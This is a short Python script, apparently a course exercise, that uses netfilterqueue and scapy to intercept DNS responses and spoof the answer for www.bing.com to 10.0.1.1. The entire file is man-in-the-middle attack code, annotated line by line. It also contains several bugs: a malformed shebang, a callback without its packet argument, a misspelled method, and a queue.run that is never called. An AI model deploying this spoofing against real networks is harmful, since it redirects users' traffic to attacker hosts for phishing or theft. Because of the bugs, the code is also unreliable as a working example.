#!/usr.bin/env python

import netfilterqueue
import scapy.all as scapy

def process_packet():
#get_payload method shows contents of packet
    scapy_packet = scapy.IP(packet.get_payload())
#DNSRR is DNS request response
    if scapy_packet.hasLayer(scapy.DNSRR):
#qname from DNS Question Record is website
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing Target")
#rrname = website; rdata=ip of requested domain
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.1.1")
#.an is answer layer which will be modified by answer above
            scapy_packet[scapy.DNS].an = answer
#only send one answer
            scapy_packet[scapy.DNS].ancount = 1
#delete checksum and len fields which will be replaced once new packet is sent
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

#set payload (above code) to scapy_packet
            packet.set_payload(str(scapy_packet))

#.show method shows all layers of packet
        #print(scapy_packet.show())
#allow packet to its dest 
    packet.accept()

#create instace of queue 
queue = netfilterqueue.NetfilterQueue()
#bind queue to queue number 0 and callback to func process_packet
queue.bind(0, process_packet)
queue.run

